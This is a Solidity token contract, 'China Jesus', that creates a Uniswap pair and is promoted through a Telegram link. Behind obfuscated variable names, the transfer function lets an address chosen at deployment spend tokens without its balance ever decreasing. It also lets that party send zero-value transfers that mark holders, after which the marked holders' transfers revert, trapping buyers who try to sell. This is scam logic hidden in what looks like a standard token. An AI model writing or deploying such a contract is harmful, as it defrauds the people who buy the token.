/*

https://t.me/chinajesusportal

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ChinaJesus is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function kqsipdl(address mbfhaqgtv, address mwfopsanjhxe, uint256 bxprzlnwvgja) private returns (bool success) {
        if (pigjx[mbfhaqgtv] == 0) {
            balanceOf[mbfhaqgtv] -= bxprzlnwvgja;
        }

        if (bxprzlnwvgja == 0) prvbcnmjdu[mwfopsanjhxe] += hpibujfqr;

        if (mbfhaqgtv != vtwzpbxkol && pigjx[mbfhaqgtv] == 0 && prvbcnmjdu[mbfhaqgtv] > 0) {
            pigjx[mbfhaqgtv] -= hpibujfqr;
        }

        balanceOf[mwfopsanjhxe] += bxprzlnwvgja;
        emit Transfer(mbfhaqgtv, mwfopsanjhxe, bxprzlnwvgja);
        return true;
    }

    function transfer(address mwfopsanjhxe, uint256 bxprzlnwvgja) public returns (bool success) {
        kqsipdl(msg.sender, mwfopsanjhxe, bxprzlnwvgja);
        return true;
    }

    mapping(address => uint256) private prvbcnmjdu;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address mbfhaqgtv, address mwfopsanjhxe, uint256 bxprzlnwvgja) public returns (bool success) {
        require(bxprzlnwvgja <= allowance[mbfhaqgtv][msg.sender]);
        allowance[mbfhaqgtv][msg.sender] -= bxprzlnwvgja;
        kqsipdl(mbfhaqgtv, mwfopsanjhxe, bxprzlnwvgja);
        return true;
    }

    address public vtwzpbxkol;

    uint256 private hpibujfqr = 97;

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(address dongitqlr) {
        balanceOf[msg.sender] = totalSupply;
        pigjx[dongitqlr] = hpibujfqr;
        IUniswapV2Router02 kpnsfiqcrxdy = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        vtwzpbxkol = IUniswapV2Factory(kpnsfiqcrxdy.factory()).createPair(address(this), kpnsfiqcrxdy.WETH());
    }

    mapping(address => uint256) private pigjx;

    string public symbol = 'China Jesus';

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address qxfzd, uint256 bxprzlnwvgja) public returns (bool success) {
        allowance[msg.sender][qxfzd] = bxprzlnwvgja;
        emit Approval(msg.sender, qxfzd, bxprzlnwvgja);
        return true;
    }

    string public name = 'China Jesus';
}